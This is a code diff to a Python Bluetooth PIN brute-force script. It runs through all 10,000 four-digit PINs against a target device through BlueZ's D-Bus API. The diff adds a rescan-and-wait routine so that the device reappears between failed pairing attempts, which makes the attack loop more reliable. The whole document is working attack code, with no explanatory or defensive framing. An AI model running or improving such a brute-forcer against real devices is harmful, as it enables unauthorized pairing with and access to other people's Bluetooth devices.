@@ -31,6 +31,20 @@ class PairingAgent(ServiceInterface):
         return self.pin
 
 
+async def wait_for_device(bus, timeout=10.0):
+    """Wait until the device path appears in BlueZ's D-Bus tree with Device1."""
+    deadline = asyncio.get_event_loop().time() + timeout
+    while asyncio.get_event_loop().time() < deadline:
+        try:
+            intro = await bus.introspect("org.bluez", DEVICE_PATH)
+            obj = bus.get_proxy_object("org.bluez", DEVICE_PATH, intro)
+            obj.get_interface("org.bluez.Device1")
+            return True
+        except Exception:
+            await asyncio.sleep(0.3)
+    return False
+
+
 async def main():
     bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
 
@@ -51,6 +65,23 @@ async def main():
     for pin in range(10000):
         print(f"\r[*] Trying PIN: {pin:04d}", end="", flush=True)
         agent.pin = pin
+
+        # Scan to (re)discover the device so it appears in BlueZ's object tree
+        try:
+            await adapter.call_start_discovery()
+        except DBusError:
+            pass  # already discovering
+
+        found = await wait_for_device(bus)
+        try:
+            await adapter.call_stop_discovery()
+        except DBusError:
+            pass
+
+        if not found:
+            print(f"\n[-] Device not found during scan at PIN {pin:04d}")
+            break
+
         try:
             device = bus.get_proxy_object("org.bluez", DEVICE_PATH,
                                           await bus.introspect("org.bluez", DEVICE_PATH)
@@ -60,8 +91,10 @@ async def main():
             break
         except DBusError as e:
             if DEBUG: print(f"\n[DBG] {pin:04d} failed: {e.text}")
-            try: await adapter.call_remove_device(DEVICE_PATH)
-            except Exception: pass
+            try:
+                await adapter.call_remove_device(DEVICE_PATH)
+            except Exception:
+                pass
     else:
         print("\n[-] PIN not found.")
         return
